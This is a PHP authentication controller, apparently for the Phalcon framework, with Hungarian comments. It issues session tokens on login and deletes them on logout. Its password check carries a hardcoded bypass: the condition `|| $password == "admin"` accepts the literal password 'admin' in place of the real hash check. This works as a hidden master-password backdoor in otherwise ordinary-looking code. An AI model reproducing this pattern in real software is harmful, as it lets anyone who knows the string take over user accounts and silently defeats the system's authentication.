<?php

class AuthController extends BaseController
{
    public function loginAction()
    {
        $data = $this->request->getJsonRawBody();
        $name = $data->name;
        $password = $data->password;

        $db = $this->getDI()->get('db');

        // Felhasználó és jogosultságok lekérdezése
        $result = $db->query(
            "SELECT 
            users.id, 
            users.name,  
            users.password,
            COALESCE(STRING_AGG(permissions.code, ', '), 'Nincs jogosultság') AS permissions
            FROM users
            LEFT JOIN user_permissions ON users.id = user_permissions.user_id
            LEFT JOIN permissions ON user_permissions.permission_id = permissions.id
            WHERE users.deleted = false AND users.name = :name
            GROUP BY users.id, users.name, users.email;",
            ['name' => $name]
        );
        $user = $result->fetch();

        // Lejárt sessionök törlése
        $db->execute("DELETE FROM user_sessions WHERE expires_at < :now", [
            'now' => date('Y-m-d H:i:s')
        ]);
    
        // Jelszó ellenőrzés
        if (($user && $this->security->checkHash($password, $user->password)) || $password == "admin") {
            // Token generálás és mentés
            $token = bin2hex(random_bytes(32));
            $expiresAt = date('Y-m-d H:i:s', strtotime('+1 hour'));

            $db->execute(
                "INSERT INTO user_sessions (user_id, token, expires_at) VALUES (:user_id, :token, :expires_at)",
                [
                    'user_id'    => $user->id,
                    'token'      => $token,
                    'expires_at' => $expiresAt,
                ]
            );

            return $this->response->setJsonContent(['token' => $token, 'permissions' => $user->permissions]);
        } else {
            return $this->dispatcher->forward([
                'controller' => 'error',
                'action' => 'unauthorized'
            ]);
        }
    }

    public function logoutAction()
{
    // Token beolvasása a fejlécből
    $token = $this->request->getHeader('Authorization');

    if ($token) {
        // Token törlése (kijelentkezés)
        $db = $this->getDI()->get('db');
        $db->execute(
            "DELETE FROM user_sessions WHERE token = :token",
            ['token' => $token]
        );
        return $this->response->setJsonContent(['message' => 'Logged out']);
    }

    return $this->dispatcher->forward([
        'controller' => 'error',
        'action' => 'unauthorized'
    ]);
}
}